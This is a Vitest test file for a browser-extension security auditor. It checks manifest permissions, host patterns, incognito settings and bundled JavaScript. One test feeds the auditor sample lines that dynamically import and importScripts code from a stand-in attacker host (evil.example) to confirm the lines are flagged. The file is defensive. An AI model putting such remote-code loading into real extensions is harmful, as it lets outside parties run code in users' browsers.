import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { auditBundleFile, auditManifest, reverseProbe } from '../../scripts/audit-manifest';

const temps: string[] = [];

function tmpManifest(manifest: Record<string, unknown>): string {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'convtools-audit-')), 'manifest.json');
  temps.push(path.dirname(file));
  fs.writeFileSync(file, JSON.stringify(manifest));
  return file;
}

function tmpManifestText(serialized: string): string {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'convtools-audit-')), 'manifest.json');
  temps.push(path.dirname(file));
  fs.writeFileSync(file, serialized);
  return file;
}

function tmpText(content: string): string {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'convtools-audit-')), 'chunk.js');
  temps.push(path.dirname(file));
  fs.writeFileSync(file, content);
  return file;
}

afterEach(() => {
  for (const dir of temps.splice(0)) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

describe('manifest auditor', () => {
  it('rejects forbidden fixed permissions and host patterns', () => {
    const result = auditManifest(
      tmpManifest({
        manifest_version: 3,
        minimum_chrome_version: '144',
        incognito: 'split',
        permissions: ['storage', 'tabs', 'unlimitedStorage'],
        host_permissions: ['<all_urls>'],
      }),
    );
    expect(result.violations).toContain('forbidden permission: tabs');
    expect(result.violations).toContain('forbidden permission: unlimitedStorage');
    expect(result.violations).toContain('forbidden host pattern: <all_urls>');
  });

  it('requires minimum version, split incognito, and MV3', () => {
    const result = auditManifest(
      tmpManifest({ manifest_version: 2, minimum_chrome_version: '100', incognito: 'spanning' }),
    );
    expect(result.violations).toContain('manifest_version must be 3');
    expect(result.violations).toContain('minimum_chrome_version must be 144');
    expect(result.violations).toContain('incognito must be split');
  });

  it('rejects eval and new Function', () => {
    const file = tmpManifest({ manifest_version: 3, minimum_chrome_version: '144', incognito: 'split' });
    fs.appendFileSync(file, '\n// eval(1)');
    expect(auditManifest(file).violations).toContain('remote/eval code detected');
  });

  it('exits nonzero on a forbidden permission via reverse probe', () => {
    expect(reverseProbe('tabs')).toBe(true);
  });

  it('passes a clean manifest', () => {
    const result = auditManifest(
      tmpManifest({
        manifest_version: 3,
        minimum_chrome_version: '144',
        incognito: 'split',
        permissions: ['storage', 'contextMenus', 'activeTab', 'scripting'],
        host_permissions: [],
      }),
    );
    expect(result.violations).toEqual([]);
  });

  it('requires the exact fixed permission set', () => {
    const result = auditManifest(
      tmpManifest({
        manifest_version: 3,
        minimum_chrome_version: '144',
        incognito: 'split',
        permissions: ['storage'],
        host_permissions: [],
      }),
    );
    expect(result.violations).toContain(
      'permissions must equal storage, contextMenus, activeTab, scripting',
    );
  });

  it('audits optional permissions and exact host patterns', () => {
    const result = auditManifest(
      tmpManifest({
        manifest_version: 3,
        minimum_chrome_version: '144',
        incognito: 'split',
        permissions: ['storage', 'contextMenus', 'activeTab', 'scripting'],
        optional_permissions: ['tabs'],
        optional_host_permissions: ['https://*.example.com/*'],
        host_permissions: [],
      }),
    );
    expect(result.violations).toContain('forbidden permission: tabs');
    expect(result.violations).toContain('invalid optional host pattern: https://*.example.com/*');
  });

  it('fails closed for malformed manifest JSON', () => {
    expect(auditManifest(tmpManifestText('{not-json')).violations).toContain('manifest JSON parse failed');
  });

  it('flags eval, new Function, and remote dynamic imports in bundle JS', () => {
    expect(auditBundleFile(tmpText('const x = eval(source);')).violations).toContain('eval/new Function in bundle');
    expect(auditBundleFile(tmpText('new Function("return 1")')).violations).toContain('eval/new Function in bundle');
    expect(auditBundleFile(tmpText('await import("https://evil.example/x.mjs")')).violations).toContain(
      'remote dynamic import in bundle',
    );
    expect(auditBundleFile(tmpText('importScripts("https://evil.example/s.js");')).violations).toContain(
      'remote importScripts in bundle',
    );
  });

  it('passes bundled JS that only contains local dynamic imports and the word eval in strings', () => {
    const clean = tmpText('const mod = await import("./chunk-abc.js"); label = "evaluative";');
    expect(auditBundleFile(clean).violations).toEqual([]);
  });

  it('rejects content scripts, web-accessible resources, and externally_connectable (M12)', () => {
    const result = auditManifest(
      tmpManifest({
        manifest_version: 3,
        minimum_chrome_version: '144',
        incognito: 'split',
        permissions: ['storage', 'contextMenus', 'activeTab', 'scripting'],
        host_permissions: [],
        // None of these keys may appear in the product output: the overlay is
        // injected with `scripting` under activeTab, page scripts must not
        // reach extension resources, and no external page may message us.
        content_scripts: [{ matches: ['<all_urls>'], js: ['inject.js'] }],
        web_accessible_resources: [{ resources: ['selection-overlay.js'], matches: ['<all_urls>'] }],
        externally_connectable: { matches: ['https://example.com/*'] },
      }),
    );
    expect(result.violations).toContain('content_scripts must be empty; the overlay is injected with scripting');
    expect(result.violations).toContain('web_accessible_resources must be empty');
    expect(result.violations).toContain('externally_connectable must not be declared');
  });

  it('accepts an empty content-script list and absent optional keys (M12)', () => {
    const result = auditManifest(
      tmpManifest({
        manifest_version: 3,
        minimum_chrome_version: '144',
        incognito: 'split',
        permissions: ['storage', 'contextMenus', 'activeTab', 'scripting'],
        host_permissions: [],
        content_scripts: [],
      }),
    );
    expect(result.violations).toEqual([]);
  });
});
